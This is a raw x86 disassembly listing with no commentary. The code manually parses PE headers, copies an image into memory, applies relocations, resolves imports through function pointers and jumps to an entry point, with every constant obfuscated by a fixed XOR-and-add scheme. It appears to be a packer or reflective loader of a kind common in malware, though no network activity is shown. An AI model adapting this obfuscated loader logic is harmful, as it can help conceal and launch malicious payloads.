  426ea9:	leave  
  426eaa:	ret    
  426eab:	push   ebp
  426eac:	mov    ebp,esp
  426eae:	push   ecx
  426eaf:	push   ecx
  426eb0:	lea    eax,[ebp-0x8]
  426eb3:	mov    DWORD PTR [ebp-0x4],eax
  426eb6:	mov    edx,DWORD PTR [ebp-0x4]
  426eb9:	mov    eax,0xf88b0bcb
  426ebe:	mov    DWORD PTR [edx],eax
  426ec0:	mov    edx,DWORD PTR [ebp-0x8]
  426ec3:	cmp    edx,eax
  426ec5:	jne    0x426ed6
  426ec7:	mov    eax,DWORD PTR [ebp+0x8]
  426eca:	mov    BYTE PTR [ecx+0x9],0xf
  426ece:	mov    BYTE PTR [eax+0x7],0x56
  426ed2:	mov    BYTE PTR [ecx+0x6],0xe
  426ed6:	mov    BYTE PTR [ecx+0x3],0x1f
  426eda:	leave  
  426edb:	ret    0x4
  426ede:	push   ebp
  426edf:	mov    ebp,esp
  426ee1:	push   ecx
  426ee2:	push   ecx
  426ee3:	lea    eax,[ebp-0x8]
  426ee6:	mov    DWORD PTR [ebp-0x4],eax
  426ee9:	mov    edx,DWORD PTR [ebp-0x4]
  426eec:	mov    eax,0x7e0da2f
  426ef1:	mov    DWORD PTR [edx],eax
  426ef3:	mov    edx,DWORD PTR [ebp-0x8]
  426ef6:	cmp    edx,eax
  426ef8:	jne    0x426efe
  426efa:	mov    BYTE PTR [ecx+0x7],0x56
  426efe:	mov    eax,DWORD PTR [ebp+0x8]
  426f01:	mov    BYTE PTR [ecx+0x1],0x18
  426f05:	mov    BYTE PTR [eax+0x9],0x2f
  426f09:	leave  
  426f0a:	ret    0x4
  426f0d:	push   ebp
  426f0e:	mov    ebp,esp
  426f10:	push   ecx
  426f11:	push   ecx
  426f12:	lea    eax,[ebp-0x8]
  426f15:	mov    DWORD PTR [ebp-0x4],eax
  426f18:	push   esi
  426f19:	mov    esi,DWORD PTR [ebp-0x4]
  426f1c:	mov    eax,0x7060e3c
  426f21:	mov    DWORD PTR [esi],eax
  426f23:	mov    esi,DWORD PTR [ebp-0x8]
  426f26:	cmp    esi,eax
  426f28:	pop    esi
  426f29:	jne    0x426f35
  426f2b:	mov    BYTE PTR [edx+0x4],0x12
  426f2f:	mov    WORD PTR [ecx+0x3],0x121f
  426f35:	mov    BYTE PTR [edx],0x3e
  426f38:	leave  
  426f39:	ret    
  426f3a:	push   ebp
  426f3b:	mov    ebp,esp
  426f3d:	push   ecx
  426f3e:	push   ecx
  426f3f:	lea    eax,[ebp-0x8]
  426f42:	mov    DWORD PTR [ebp-0x4],eax
  426f45:	mov    edx,DWORD PTR [ebp-0x4]
  426f48:	mov    eax,0xf8870b3f
  426f4d:	mov    DWORD PTR [edx],eax
  426f4f:	mov    edx,DWORD PTR [ebp-0x8]
  426f52:	cmp    edx,eax
  426f54:	jne    0x426f61
  426f56:	mov    eax,DWORD PTR [ebp+0x8]
  426f59:	mov    BYTE PTR [ecx+0x8],0xe
  426f5d:	mov    BYTE PTR [eax+0x1],0x18
  426f61:	mov    BYTE PTR [ecx+0x5],0xa
  426f65:	leave  
  426f66:	ret    0x4
  426f69:	push   esi
  426f6a:	mov    ecx,edi
  426f6c:	call   0x426f3a
  426f71:	mov    edx,edi
  426f73:	mov    ecx,esi
  426f75:	mov    BYTE PTR [esi],0x1e
  426f78:	call   0x426f0d
  426f7d:	push   esi
  426f7e:	mov    ecx,edi
  426f80:	mov    BYTE PTR [esi+0x5],0xa
  426f84:	call   0x426ede
  426f89:	push   esi
  426f8a:	mov    BYTE PTR [esi+0x6],0xe
  426f8e:	call   0x426eab
  426f93:	mov    BYTE PTR [esi+0x2],0x15
  426f97:	mov    edx,esi
  426f99:	jmp    0x426e7b
  426f9e:	push   ebp
  426f9f:	mov    ebp,esp
  426fa1:	push   ecx
  426fa2:	mov    ecx,DWORD PTR [edx+0x194]
  426fa8:	push   esi
  426fa9:	mov    esi,DWORD PTR [ebp+0x8]
  426fac:	mov    esi,DWORD PTR [esi]
  426fae:	mov    DWORD PTR [ecx],esi
  426fb0:	mov    ecx,DWORD PTR [edx+0x194]
  426fb6:	mov    ecx,DWORD PTR [ecx]
  426fb8:	mov    esi,DWORD PTR [edx+0x190]
  426fbe:	mov    DWORD PTR [esi],ecx
  426fc0:	mov    eax,DWORD PTR [edx+0x194]
  426fc6:	mov    ecx,DWORD PTR [eax]
  426fc8:	mov    ecx,DWORD PTR [ecx+0x3c]
  426fcb:	add    ecx,DWORD PTR [eax]
  426fcd:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426fd4:	mov    eax,DWORD PTR [ebp-0x4]
  426fd7:	movzx  ecx,WORD PTR [ecx+0x16]
  426fdb:	xor    eax,0x75108ae
  426fe0:	add    eax,0x3272f5
  426fe5:	pop    esi
  426fe6:	test   ecx,eax
  426fe8:	je     0x426ff6
  426fea:	mov    eax,DWORD PTR [edx+0x1c8]
  426ff0:	mov    DWORD PTR [eax],0xf89c85a2
  426ff6:	leave  
  426ff7:	ret    0x4
  426ffa:	push   ebp
  426ffb:	mov    ebp,esp
  426ffd:	sub    esp,0x70
  427000:	and    DWORD PTR [ebp-0x20],0x0
  427004:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42700b:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  427012:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  427019:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  427020:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  427027:	mov    eax,DWORD PTR [ebp+0x20]
  42702a:	mov    eax,DWORD PTR [eax+0x194]
  427030:	mov    DWORD PTR [ebp-0xc],eax
  427033:	mov    eax,DWORD PTR [ebp+0x20]
  427036:	push   ebx
  427037:	push   esi
  427038:	mov    esi,DWORD PTR [eax+0x190]
  42703e:	mov    eax,DWORD PTR [ebp+0x20]
  427041:	mov    eax,DWORD PTR [eax+0x18c]
  427047:	mov    DWORD PTR [ebp-0x8],eax
  42704a:	mov    eax,DWORD PTR [eax]
  42704c:	push   edi
  42704d:	mov    DWORD PTR [ebp-0x4],esi
  427050:	test   eax,eax
  427052:	jne    0x42705f
  427054:	push   DWORD PTR [ebp+0x1c]
  427057:	mov    edx,DWORD PTR [ebp+0x20]
  42705a:	call   0x426f9e
  42705f:	mov    eax,DWORD PTR [esi]
  427061:	mov    ebx,DWORD PTR [esi]
  427063:	add    ebx,DWORD PTR [eax+0x3c]
  427066:	mov    eax,DWORD PTR [ebp+0xc]
  427069:	mov    ecx,DWORD PTR [ebp-0x8]
  42706c:	mov    ecx,DWORD PTR [ecx]
  42706e:	mov    esi,0x75108ae
  427073:	xor    eax,esi
  427075:	mov    edi,0x3272f5
  42707a:	add    eax,edi
  42707c:	cmp    eax,ecx
  42707e:	jne    0x4272b6
  427084:	mov    eax,DWORD PTR [ebp-0xc]
  427087:	mov    eax,DWORD PTR [eax]
  427089:	mov    DWORD PTR [ebp-0x10],eax
  42708c:	mov    eax,DWORD PTR [ebx+0x50]
  42708f:	mov    DWORD PTR [ebp-0x68],eax
  427092:	mov    eax,DWORD PTR [ebp-0x18]
  427095:	xor    eax,esi
  427097:	add    eax,edi
  427099:	mov    DWORD PTR [ebp-0x64],eax
  42709c:	mov    eax,DWORD PTR [ebp-0x14]
  42709f:	and    DWORD PTR [ebp-0x6c],0x0
  4270a3:	xor    eax,esi
  4270a5:	add    eax,edi
  4270a7:	mov    DWORD PTR [ebp-0x60],eax
  4270aa:	lea    eax,[ebp-0x70]
  4270ad:	push   eax
  4270ae:	mov    eax,DWORD PTR [ebp+0x8]
  4270b1:	xor    eax,esi
  4270b3:	add    eax,edi
  4270b5:	push   eax
  4270b6:	mov    eax,DWORD PTR [ebp+0x20]
  4270b9:	add    eax,0xaa
  4270be:	push   eax
  4270bf:	mov    eax,DWORD PTR [ebp+0x20]
  4270c2:	mov    eax,DWORD PTR [eax+0x198]
  4270c8:	mov    DWORD PTR [ebp-0x70],0x4
  4270cf:	push   DWORD PTR [eax]
  4270d1:	mov    eax,DWORD PTR [ebp+0x10]
  4270d4:	call   eax
  4270d6:	mov    ecx,DWORD PTR [ebp-0xc]
  4270d9:	mov    ecx,DWORD PTR [ecx]
  4270db:	mov    edx,DWORD PTR [ebp-0x8]
  4270de:	mov    DWORD PTR [ebp-0x6c],eax
  4270e1:	mov    DWORD PTR [ebp+0x1c],eax
  4270e4:	mov    DWORD PTR [edx],ecx
  4270e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4270e9:	mov    DWORD PTR [ecx],eax
  4270eb:	mov    eax,DWORD PTR [ebx+0x50]
  4270ee:	mov    DWORD PTR [ebp-0x68],eax
  4270f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4270f4:	xor    eax,esi
  4270f6:	add    eax,edi
  4270f8:	mov    DWORD PTR [ebp-0x64],eax
  4270fb:	lea    eax,[ebp-0x20]
  4270fe:	mov    DWORD PTR [ebp-0x60],eax
  427101:	lea    eax,[ebp-0x70]
  427104:	push   eax
  427105:	mov    eax,DWORD PTR [ebp+0x8]
  427108:	xor    eax,esi
  42710a:	add    eax,edi
  42710c:	push   eax
  42710d:	mov    eax,DWORD PTR [ebp+0x20]
  427110:	add    eax,0xee
  427115:	push   eax
  427116:	mov    eax,DWORD PTR [ebp+0x20]
  427119:	mov    eax,DWORD PTR [eax+0x198]
  42711f:	mov    DWORD PTR [ebp-0x70],0x4
  427126:	push   DWORD PTR [eax]
  427128:	mov    eax,DWORD PTR [ebp+0x10]
  42712b:	call   eax
  42712d:	test   eax,eax
  42712f:	je     0x427154
  427131:	and    DWORD PTR [ebp+0xc],0x0
  427135:	cmp    DWORD PTR [ebx+0x50],0x0
  427139:	jbe    0x427154
  42713b:	mov    eax,DWORD PTR [ebp+0x1c]
  42713e:	mov    ecx,DWORD PTR [ebp-0x10]
  427141:	sub    ecx,eax
  427143:	mov    dl,BYTE PTR [ecx+eax*1]
  427146:	inc    DWORD PTR [ebp+0xc]
  427149:	mov    BYTE PTR [eax],dl
  42714b:	mov    edx,DWORD PTR [ebp+0xc]
  42714e:	inc    eax
  42714f:	cmp    edx,DWORD PTR [ebx+0x50]
  427152:	jb     0x427143
  427154:	mov    edx,DWORD PTR [ebp+0x1c]
  427157:	mov    ecx,DWORD PTR [edx+0x3c]
  42715a:	add    ecx,edx
  42715c:	mov    eax,DWORD PTR [ecx+0xa0]
  427162:	mov    ebx,DWORD PTR [ecx+0x28]
  427165:	add    eax,edx
  427167:	sub    edx,DWORD PTR [ebp-0x10]
  42716a:	add    ebx,DWORD PTR [ebp+0x1c]
  42716d:	mov    DWORD PTR [ebp+0xc],edx
  427170:	mov    DWORD PTR [ebp-0x2c],ecx
  427173:	mov    DWORD PTR [ebp-0x14],ebx
  427176:	mov    DWORD PTR [ebp-0x8],0x0
  42717d:	jmp    0x4271f9
  42717f:	add    edx,0xfffffff8
  427182:	shr    edx,1
  427184:	mov    DWORD PTR [ebp-0x18],edx
  427187:	je     0x4271e5
  427189:	lea    edx,[eax+0x8]
  42718c:	mov    DWORD PTR [ebp-0x4],edx
  42718f:	mov    edx,DWORD PTR [ebp-0x18]
  427192:	mov    DWORD PTR [ebp-0x18],edx
  427195:	mov    edx,DWORD PTR [ebp-0x4]
  427198:	movzx  edx,WORD PTR [edx]
  42719b:	mov    DWORD PTR [ebp-0x24],edx
  42719e:	and    edx,0xfff
  4271a4:	mov    DWORD PTR [ebp-0x28],edx
  4271a7:	mov    edx,DWORD PTR [ebp-0x24]
  4271aa:	shr    edx,0xc
  4271ad:	add    edx,0xffcd8d0b
  4271b3:	xor    edx,esi
  4271b5:	cmp    edx,0xf89c85a0
  4271bb:	jne    0x4271dc
  4271bd:	mov    edx,DWORD PTR [ebp-0x28]
  4271c0:	add    edx,DWORD PTR [ebp+0x1c]
  4271c3:	mov    ebx,DWORD PTR [eax]
  4271c5:	cmp    DWORD PTR [ebx+edx*1],0x0
  4271c9:	je     0x4271d9
  4271cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4271ce:	add    ecx,DWORD PTR [ebx+edx*1]
  4271d1:	mov    ebx,DWORD PTR [eax]
  4271d3:	mov    DWORD PTR [edx+ebx*1],ecx
  4271d6:	mov    ecx,DWORD PTR [ebp-0x2c]
  4271d9:	mov    ebx,DWORD PTR [ebp-0x14]
  4271dc:	add    DWORD PTR [ebp-0x4],0x2
  4271e0:	dec    DWORD PTR [ebp-0x18]
  4271e3:	jne    0x427195
  4271e5:	mov    edx,DWORD PTR [ebp-0xc]
  4271e8:	add    DWORD PTR [ebp-0x8],edx
  4271eb:	mov    edx,DWORD PTR [ebp-0x8]
  4271ee:	cmp    edx,DWORD PTR [ecx+0xa4]
  4271f4:	jae    0x427207
  4271f6:	add    eax,DWORD PTR [ebp-0xc]
  4271f9:	mov    edx,DWORD PTR [eax+0x4]
  4271fc:	mov    DWORD PTR [ebp-0xc],edx
  4271ff:	test   edx,edx
  427201:	jne    0x42717f
  427207:	mov    eax,DWORD PTR [ebp-0x10]
  42720a:	mov    DWORD PTR [ebp-0x6c],eax
  42720d:	mov    DWORD PTR [ebp-0x70],0x4
  427214:	mov    eax,DWORD PTR [ecx+0x50]
  427217:	mov    DWORD PTR [ebp-0x68],eax
  42721a:	mov    eax,DWORD PTR [ebp-0x1c]
  42721d:	xor    eax,esi
  42721f:	add    eax,edi
  427221:	mov    DWORD PTR [ebp-0x64],eax
  427224:	lea    eax,[ebp-0x20]
  427227:	mov    DWORD PTR [ebp-0x60],eax
  42722a:	lea    eax,[ebp-0x70]
  42722d:	push   eax
  42722e:	mov    eax,DWORD PTR [ebp+0x8]
  427231:	xor    eax,esi
  427233:	add    eax,edi
  427235:	push   eax
  427236:	mov    eax,DWORD PTR [ebp+0x20]
  427239:	add    eax,0xee
  42723e:	push   eax
  42723f:	mov    eax,DWORD PTR [ebp+0x20]
  427242:	mov    eax,DWORD PTR [eax+0x198]
  427248:	push   DWORD PTR [eax]
  42724a:	mov    eax,DWORD PTR [ebp+0x10]
  42724d:	call   eax
  42724f:	mov    eax,DWORD PTR [ebp+0x20]
  427252:	mov    eax,DWORD PTR [eax+0x180]
  427258:	add    eax,DWORD PTR [ebp+0xc]
  42725b:	mov    ecx,DWORD PTR [ebp+0xc]
  42725e:	push   DWORD PTR [ebp+0x18]
  427261:	mov    DWORD PTR [eax],ecx
  427263:	push   DWORD PTR [ebp+0x14]
  427266:	push   DWORD PTR [ebp+0x1c]
  427269:	call   ebx
  42726b:	mov    ecx,DWORD PTR [ebp+0xc]
  42726e:	add    ecx,DWORD PTR [ebp+0x20]
  427271:	lea    eax,[ebp+0x4]
  427274:	mov    DWORD PTR [ebp+0x20],ecx
  427277:	mov    ecx,DWORD PTR [ebp+0x20]
  42727a:	mov    ecx,DWORD PTR [ebp+0x20]
  42727d:	mov    edx,DWORD PTR [ecx+0x190]
  427283:	mov    ecx,DWORD PTR [ebp+0x20]
  427286:	mov    ecx,DWORD PTR [ecx+0x18c]
  42728c:	mov    esi,DWORD PTR [ecx]
  42728e:	cmp    DWORD PTR [eax],esi
  427290:	jb     0x4272b1
  427292:	mov    esi,DWORD PTR [edx]
  427294:	mov    edi,DWORD PTR [edx]
  427296:	mov    esi,DWORD PTR [esi+0x3c]
  427299:	lea    esi,[edi+esi*1+0x50]
  42729d:	mov    edi,DWORD PTR [ecx]
  42729f:	add    edi,DWORD PTR [esi]
  4272a1:	cmp    DWORD PTR [eax],edi
  4272a3:	jae    0x4272b1
  4272a5:	mov    esi,DWORD PTR [ecx]
  4272a7:	mov    ecx,DWORD PTR [eax]
  4272a9:	mov    edx,DWORD PTR [edx]
  4272ab:	sub    ecx,esi
  4272ad:	add    edx,ecx
  4272af:	mov    DWORD PTR [eax],edx
  4272b1:	mov    eax,DWORD PTR [ebp+0xc]
  4272b4:	jmp    0x4272b8
  4272b6:	xor    eax,eax
  4272b8:	pop    edi
  4272b9:	pop    esi
  4272ba:	pop    ebx
  4272bb:	leave  
  4272bc:	ret    0x1c
  4272bf:	push   ebp
  4272c0:	mov    ebp,esp
  4272c2:	sub    esp,0x1c
  4272c5:	push   esi
  4272c6:	mov    esi,eax
  4272c8:	mov    eax,DWORD PTR [ecx+0x190]
  4272ce:	cmp    DWORD PTR [eax],0x0
  4272d1:	je     0x4273e1
  4272d7:	test   edx,edx
  4272d9:	je     0x4273e1
  4272df:	test   esi,esi
  4272e1:	je     0x4273e1
  4272e7:	mov    eax,DWORD PTR [esi+0x88]
  4272ed:	test   eax,eax
  4272ef:	je     0x4273dc
  4272f5:	cmp    DWORD PTR [esi+0x8c],0x10
  4272fc:	je     0x4273dc
  427302:	cmp    DWORD PTR [esi+0x34],edx
  427305:	je     0x4273dc
  42730b:	mov    esi,DWORD PTR [ecx+0x18c]
  427311:	and    DWORD PTR [ebp-0x10],0x0
  427315:	mov    ecx,edx
  427317:	sub    ecx,DWORD PTR [esi]
  427319:	add    eax,edx
  42731b:	movzx  edx,WORD PTR [eax+0xc]
  42731f:	mov    DWORD PTR [ebp-0x1c],ecx
  427322:	movzx  ecx,WORD PTR [eax+0xe]
  427326:	add    ecx,edx
  427328:	je     0x4273dc
  42732e:	lea    ecx,[eax+0x14]
  427331:	push   ebx
  427332:	mov    DWORD PTR [ebp-0x18],ecx
  427335:	mov    esi,0x7fffffff
  42733a:	push   edi
  42733b:	test   DWORD PTR [ecx],esi
  42733d:	je     0x4273be
  42733f:	mov    edx,DWORD PTR [ecx]
  427341:	and    DWORD PTR [ebp-0xc],0x0
  427345:	and    edx,esi
  427347:	add    edx,eax
  427349:	movzx  edi,WORD PTR [edx+0xe]
  42734d:	movzx  ebx,WORD PTR [edx+0xc]
  427351:	add    edi,ebx
  427353:	je     0x4273be
  427355:	lea    ecx,[edx+0x14]
  427358:	mov    DWORD PTR [ebp-0x14],ecx
  42735b:	test   DWORD PTR [ecx],esi
  42735d:	je     0x4273a0
  42735f:	mov    ecx,DWORD PTR [ecx]
  427361:	and    DWORD PTR [ebp-0x8],0x0
  427365:	and    ecx,esi
  427367:	add    ecx,eax
  427369:	movzx  edi,WORD PTR [ecx+0xe]
  42736d:	movzx  ebx,WORD PTR [ecx+0xc]
  427371:	add    edi,ebx
  427373:	je     0x4273a0
  427375:	lea    edi,[ecx+0x14]
  427378:	mov    DWORD PTR [ebp-0x4],edi
  42737b:	mov    edi,DWORD PTR [ebp-0x4]
  42737e:	mov    edi,DWORD PTR [edi]
  427380:	test   edi,edi
  427382:	je     0x42738a
  427384:	mov    ebx,DWORD PTR [ebp-0x1c]
  427387:	add    DWORD PTR [edi+eax*1],ebx
  42738a:	movzx  edi,WORD PTR [ecx+0xe]
  42738e:	movzx  ebx,WORD PTR [ecx+0xc]
  427392:	inc    DWORD PTR [ebp-0x8]
  427395:	add    DWORD PTR [ebp-0x4],0x8
  427399:	add    edi,ebx
  42739b:	cmp    DWORD PTR [ebp-0x8],edi
  42739e:	jb     0x42737b
  4273a0:	movzx  edi,WORD PTR [edx+0xe]
  4273a4:	movzx  ebx,WORD PTR [edx+0xc]
  4273a8:	mov    ecx,DWORD PTR [ebp-0x14]
  4273ab:	inc    DWORD PTR [ebp-0xc]
  4273ae:	add    ecx,0x8
  4273b1:	add    edi,ebx
  4273b3:	mov    DWORD PTR [ebp-0x14],ecx
  4273b6:	cmp    DWORD PTR [ebp-0xc],edi
  4273b9:	jb     0x42735b
  4273bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4273be:	movzx  edx,WORD PTR [eax+0xe]
  4273c2:	movzx  edi,WORD PTR [eax+0xc]
  4273c6:	inc    DWORD PTR [ebp-0x10]
  4273c9:	add    ecx,0x8
  4273cc:	add    edx,edi
  4273ce:	mov    DWORD PTR [ebp-0x18],ecx
  4273d1:	cmp    DWORD PTR [ebp-0x10],edx
  4273d4:	jb     0x42733b
  4273da:	pop    edi
  4273db:	pop    ebx
  4273dc:	xor    eax,eax
  4273de:	inc    eax
  4273df:	jmp    0x4273e3
  4273e1:	xor    eax,eax
  4273e3:	pop    esi
  4273e4:	leave  
  4273e5:	ret    
  4273e6:	push   ebp
  4273e7:	mov    ebp,esp
  4273e9:	mov    ecx,DWORD PTR [ecx+0x190]
  4273ef:	mov    eax,DWORD PTR [ebp+0xc]
  4273f2:	sub    esp,0x10
  4273f5:	push   ebx
  4273f6:	xor    ebx,ebx
  4273f8:	push   esi
  4273f9:	push   edi
  4273fa:	cmp    DWORD PTR [ecx],ebx
  4273fc:	je     0x427484
  427402:	cmp    eax,ebx
  427404:	je     0x427484
  427406:	cmp    DWORD PTR [eax+0x78],ebx
  427409:	jne    0x427410
  42740b:	xor    eax,eax
  42740d:	inc    eax
  42740e:	jmp    0x427486
  427410:	mov    eax,DWORD PTR [eax+0x78]
  427413:	add    eax,DWORD PTR [ebp+0x8]
  427416:	mov    ecx,DWORD PTR [eax+0x1c]
  427419:	mov    edx,DWORD PTR [eax+0x24]
  42741c:	mov    esi,DWORD PTR [eax+0x14]
  42741f:	mov    edi,DWORD PTR [eax+0x18]
  427422:	add    ecx,DWORD PTR [ebp+0x8]
  427425:	add    edx,DWORD PTR [ebp+0x8]
  427428:	mov    DWORD PTR [ebp-0x4],esi
  42742b:	cmp    esi,edi
  42742d:	ja     0x427432
  42742f:	mov    DWORD PTR [ebp-0x4],edi
  427432:	mov    DWORD PTR [ebp-0x8],ebx
  427435:	cmp    DWORD PTR [ebp-0x4],ebx
  427438:	jbe    0x42740b
  42743a:	cmp    ebx,DWORD PTR [eax+0x14]
  42743d:	jae    0x427445
  42743f:	movzx  esi,WORD PTR [edx+ebx*2]
  427443:	jmp    0x427447
  427445:	mov    esi,ebx
  427447:	lea    esi,[ecx+esi*4]
  42744a:	mov    edi,DWORD PTR [esi]
  42744c:	test   edi,edi
  42744e:	je     0x427479
  427450:	add    edi,DWORD PTR [ebp+0x8]
  427453:	mov    DWORD PTR [ebp-0x10],edi
  427456:	cmp    edi,eax
  427458:	jbe    0x42746a
  42745a:	mov    ebx,DWORD PTR [ebp+0xc]
  42745d:	mov    ebx,DWORD PTR [ebx+0x7c]
  427460:	add    ebx,eax
  427462:	cmp    edi,ebx
  427464:	jae    0x42746a
  427466:	mov    esi,DWORD PTR [esi]
  427468:	jmp    0x427472
  42746a:	sub    edi,DWORD PTR [ebp+0x8]
  42746d:	mov    DWORD PTR [esi],edi
  42746f:	mov    esi,DWORD PTR [ebp-0x10]
  427472:	test   esi,esi
  427474:	je     0x427484
  427476:	mov    ebx,DWORD PTR [ebp-0x8]
  427479:	inc    ebx
  42747a:	mov    DWORD PTR [ebp-0x8],ebx
  42747d:	cmp    ebx,DWORD PTR [ebp-0x4]
  427480:	jb     0x42743a
  427482:	jmp    0x42740b
  427484:	xor    eax,eax
  427486:	pop    edi
  427487:	pop    esi
  427488:	pop    ebx
  427489:	leave  
  42748a:	ret    0x8
  42748d:	push   ebp
  42748e:	mov    ebp,esp
  427490:	sub    esp,0x2c
  427493:	mov    edx,0xf89c85a5
  427498:	mov    DWORD PTR [ebp-0x4],edx
  42749b:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4274a2:	mov    eax,DWORD PTR [ebp-0x4]
  4274a5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4274ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4274ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4274b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4274b4:	push   ebx
  4274b5:	mov    ebx,DWORD PTR [ebp+0x10]
  4274b8:	push   esi
  4274b9:	mov    esi,0x75108ae
  4274be:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  4274c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4274c8:	mov    ebx,DWORD PTR [ebx+0x190]
  4274ce:	push   edi
  4274cf:	mov    edi,0x3272f5
  4274d4:	xor    ecx,esi
  4274d6:	xor    eax,esi
  4274d8:	add    eax,edi
  4274da:	add    ecx,edi
  4274dc:	mov    DWORD PTR [ebp-0x18],eax
  4274df:	cmp    ecx,DWORD PTR [ebx]
  4274e1:	je     0x427762
  4274e7:	mov    ebx,DWORD PTR [ebp-0x4]
  4274ea:	mov    ecx,DWORD PTR [ebp+0xc]
  4274ed:	xor    ebx,esi
  4274ef:	add    ebx,edi
  4274f1:	cmp    ebx,ecx
  4274f3:	je     0x427762
  4274f9:	mov    ebx,DWORD PTR [ebp-0x4]
  4274fc:	mov    ecx,DWORD PTR [ecx+0x80]
  427502:	xor    ebx,esi
  427504:	add    ebx,edi
  427506:	cmp    ecx,ebx
  427508:	je     0x42775d
  42750e:	add    ecx,DWORD PTR [ebp+0x8]
  427511:	mov    DWORD PTR [ebp-0x2c],ecx
  427514:	mov    ebx,edx
  427516:	xor    ebx,esi
  427518:	add    ebx,edi
  42751a:	mov    DWORD PTR [ebp-0x10],ebx
  42751d:	mov    ebx,DWORD PTR [ebp-0x10]
  427520:	cmp    ebx,edx
  427522:	je     0x427536
  427524:	mov    edx,DWORD PTR [ebp-0x10]
  427527:	mov    ebx,DWORD PTR [ebp-0x4]
  42752a:	imul   edx,edx,0x14
  42752d:	xor    ebx,esi
  42752f:	add    ebx,edi
  427531:	cmp    DWORD PTR [edx+ecx*1],ebx
  427534:	jne    0x42754d
  427536:	mov    edx,DWORD PTR [ebp-0x10]
  427539:	mov    ebx,DWORD PTR [ebp-0x4]
  42753c:	imul   edx,edx,0x14
  42753f:	xor    ebx,esi
  427541:	add    ebx,edi
  427543:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  427547:	je     0x42774f
  42754d:	mov    eax,DWORD PTR [ebp-0x4]
  427550:	mov    ebx,DWORD PTR [ebp-0x4]
  427553:	mov    eax,DWORD PTR [ebp-0x10]
  427556:	imul   eax,eax,0x14
  427559:	add    eax,ecx
  42755b:	mov    ecx,DWORD PTR [eax+0x10]
  42755e:	add    ecx,DWORD PTR [ebp+0x8]
  427561:	xor    ebx,esi
  427563:	mov    DWORD PTR [ebp-0x1c],ecx
  427566:	mov    ecx,DWORD PTR [ebp-0x4]
  427569:	mov    edx,DWORD PTR [ebp-0x4]
  42756c:	xor    ecx,esi
  42756e:	add    ecx,edi
  427570:	xor    edx,esi
  427572:	mov    DWORD PTR [ebp-0x24],ecx
  427575:	mov    ecx,DWORD PTR [eax]
  427577:	add    edx,edi
  427579:	add    ebx,edi
  42757b:	cmp    ecx,edx
  42757d:	je     0x427585
  42757f:	add    ecx,DWORD PTR [ebp+0x8]
  427582:	mov    DWORD PTR [ebp-0x24],ecx
  427585:	mov    ecx,DWORD PTR [ebp-0x4]
  427588:	xor    ecx,esi
  42758a:	add    ecx,DWORD PTR [eax+0xc]
  42758d:	mov    eax,DWORD PTR [ebp+0x8]
  427590:	lea    eax,[ecx+eax*1+0x3272f5]
  427597:	mov    DWORD PTR [ebp+0xc],eax
  42759a:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4275a1:	mov    eax,DWORD PTR [ebp+0x10]
  4275a4:	push   DWORD PTR [ebp+0xc]
  4275a7:	mov    eax,DWORD PTR [eax+0x1e0]
  4275ad:	call   DWORD PTR [eax]
  4275af:	mov    ecx,DWORD PTR [ebp-0x4]
  4275b2:	xor    ecx,esi
  4275b4:	add    ecx,edi
  4275b6:	mov    DWORD PTR [ebp-0xc],eax
  4275b9:	cmp    ecx,eax
  4275bb:	jne    0x4275cf
  4275bd:	mov    eax,DWORD PTR [ebp+0x10]
  4275c0:	push   DWORD PTR [ebp+0xc]
  4275c3:	mov    eax,DWORD PTR [eax+0x1e0]
  4275c9:	call   DWORD PTR [eax+0xc]
  4275cc:	mov    DWORD PTR [ebp-0xc],eax
  4275cf:	mov    DWORD PTR [ebp-0x20],0x7f661b2a
  4275d6:	mov    DWORD PTR [ebp-0x20],0xf89c985a
  4275dd:	mov    eax,DWORD PTR [ebp-0x4]
  4275e0:	xor    eax,esi
  4275e2:	add    eax,edi
  4275e4:	cmp    eax,DWORD PTR [ebp-0xc]
  4275e7:	jne    0x42760c
  4275e9:	mov    eax,DWORD PTR [ebp-0x8]
  4275ec:	mov    ecx,DWORD PTR [ebp-0x20]
  4275ef:	xor    eax,esi
  4275f1:	xor    ecx,esi
  4275f3:	lea    ebx,[ebx+eax*1+0x3272f5]
  4275fa:	mov    eax,DWORD PTR [ebp+0x10]
  4275fd:	mov    eax,DWORD PTR [eax+0x1e0]
  427603:	add    ecx,edi
  427605:	imul   ecx,ebx
  427608:	push   ecx
  427609:	call   DWORD PTR [eax+0x24]
  42760c:	mov    eax,DWORD PTR [ebp-0x4]
  42760f:	xor    eax,esi
  427611:	add    eax,edi
  427613:	cmp    eax,DWORD PTR [ebp-0xc]
  427616:	jne    0x427627
  427618:	mov    eax,DWORD PTR [ebp-0x28]
  42761b:	xor    eax,esi
  42761d:	add    eax,edi
  42761f:	cmp    ebx,eax
  427621:	jbe    0x4275a1
  427627:	mov    eax,DWORD PTR [ebp-0x4]
  42762a:	xor    eax,esi
  42762c:	add    eax,edi
  42762e:	cmp    eax,DWORD PTR [ebp-0xc]
  427631:	jne    0x42764a
  427633:	mov    eax,DWORD PTR [ebp-0x8]
  427636:	mov    ecx,DWORD PTR [ebp-0x18]
  427639:	xor    eax,esi
  42763b:	lea    eax,[ecx+eax*1+0x3272f5]
  427642:	mov    DWORD PTR [ebp-0x18],eax
  427645:	jmp    0x427739
  42764a:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427651:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  427658:	mov    ebx,DWORD PTR [ebp-0x4]
  42765b:	xor    ebx,esi
  42765d:	add    ebx,edi
  42765f:	jmp    0x427726
  427664:	mov    eax,DWORD PTR [ebp-0x4]
  427667:	xor    eax,esi
